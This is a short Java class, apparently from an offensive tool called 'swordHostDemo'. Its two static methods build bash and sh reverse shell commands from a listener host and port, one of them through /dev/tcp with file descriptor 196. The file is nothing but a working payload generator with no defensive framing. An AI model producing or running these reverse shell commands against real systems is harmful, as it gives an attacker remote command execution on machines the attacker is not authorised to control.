package com.swordHostDemo.controller;

/**
 * @date: 2022/12/29 20:30
 * @description:
 */
public class ReverseController {
    public static String ReverseBash1(String Lhost, String Lport) {
        String str = "bash -i >& /dev/tcp/" + Lhost + "/" + Lport + " 0>&1";

        System.out.println("原始字符串：" + str);
        return str;
    }

    public static String ReverseBash2(String Lhost, String Lport){
        String str = "0<&196;exec 196<>/dev/tcp/"+Lhost+"/"+Lport+"; sh <&196 >&196 2>&196";
        return str;
    }


}
